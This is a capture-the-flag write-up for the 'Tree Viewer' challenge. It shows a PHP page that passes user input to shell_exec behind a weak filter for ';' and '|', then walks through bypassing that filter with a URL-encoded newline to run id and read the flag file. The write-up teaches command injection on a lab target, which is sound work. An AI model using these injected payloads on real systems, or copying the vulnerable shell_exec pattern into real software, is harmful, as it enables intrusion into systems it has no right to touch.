# Tree Viewer

## Table of Contents

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

## Overview

- 360 solves / 50 points
- Difficulty: Intro
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

> Author: Eteck#3426

Here, you can check the content of any directories present on the server.

Find a way to abuse this functionality, and read the content of `/home/flag.txt`

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PwnMe-2023-8-bits/images/Pasted%20image%2020230506114909.png)

In here, we can view the source code, and an input box, which allows us to check a directory.

**Let's look at the source code:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PwnMe-2023-8-bits/images/Pasted%20image%2020230506114959.png)

When the `source` GET parameter is provided, it'll highlight the index file.

```php
<?php
$parsed = isset($_POST['input']) ? $_POST['input'] : "/home/";

preg_match_all('/[;|]/m', $parsed, $illegals, PREG_SET_ORDER, 0);
if($illegals){
    echo "Illegals chars found";
    $parsed = "/home/";
}

if(isset($_GET['source'])){
    highlight_file(__FILE__);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tree Viewer</title>
</head>
<body>
    <a href="/?source">Source code</a>
    <hr/>
    <form action="/" method="post">
        <label for="input">Directory to check</label>
    <input type="text" placeholder="Directory to see" id="input" name="input" value="<?= $parsed ?>">
    </form>

    <h3>Content of <?= $parsed ?>: <?= shell_exec('ls '.$parsed); ?></h3>
    
</body>
</html>
```

Let's break it down!

When `input` POST parameter is provided, ***it'll check the input contains `;` OR `|` character via regular expression (regex)***. If no `input` parameter is provided or it contains `;` OR `|`, default value will be `/home/`.

Finally, it'll **parse our `input` to a `shell_exec()` function, which will execute shell command!**

Nice, we found a sink (Dangerous function)!

**Let's look at the `shell_exec()` function:**
```php
<?= shell_exec('ls '.$parsed); ?>
```

This function will execute `ls <path>`!

That being said, although it has a regex filter, it's still **vulnerable to OS command injection!**

## Exploitation

**To bypass it, I'll use the new line character `\n` (`%0a` in URL encoding)!**
```shell
%0aid
```

**Also, I'll be using Burp Suite's Repeater to send the payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PwnMe-2023-8-bits/images/Pasted%20image%2020230506115756.png)

Boom! We have Remote Code Execution (RCE)!

**Let's read the flag!**
```shell
%0acat /home/flag.txt
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/PwnMe-2023-8-bits/images/Pasted%20image%2020230506115910.png)

- **Flag: `PWNME{U53R_1NpU75_1n_5h3lL_3x3c_77}`**

## Conclusion

What we've learned:

1. Exploiting OS Command Injection & Bypassing Filters